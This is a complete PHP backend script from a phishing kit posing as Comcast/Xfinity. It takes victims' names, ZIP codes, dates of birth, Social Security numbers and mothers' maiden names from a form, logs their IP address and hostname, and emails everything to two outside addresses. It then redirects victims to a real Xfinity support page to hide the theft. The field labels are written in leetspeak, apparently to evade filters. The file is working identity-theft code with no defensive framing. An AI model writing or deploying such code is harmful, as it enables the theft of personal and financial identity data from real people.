<?php
if($_POST["firstname"] != "" and $_POST["lastname"] != "" and $_POST["zip"] != "" and $_POST["dob"] != "" and $_POST["ss"] != "" and $_POST["mmn"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------c0mc4st Info-----------------------\n";
$message .= "|N4m3 : ".$_POST['firstname']."\n";
$message .= "|5urn4m3  : ".$_POST['lastname']."\n";
$message .= "|z1p : ".$_POST['zip']."\n";
$message .= "|d0b  : ".$_POST['dob']."\n";
$message .= "|5sn : ".$_POST['ss']."\n";
$message .= "|mmn  : ".$_POST['mmn']."\n";
$message .= "|----------- unknown --------------|\n";
$send = "henrygiles231@protonmail.com,moor3jam3s@yandex.com";
$subject = "Result from c0mc4st | $ip";
{
mail("$send", "$subject", $message);   
}

$praga=rand();
$praga=md5($praga);
  header ("Location: http://customer.xfinity.com/help-and-support/internet/requirements-to-run-xfinity-internet-service/");
}else{
header ("Location: index.htm");
}

?>
 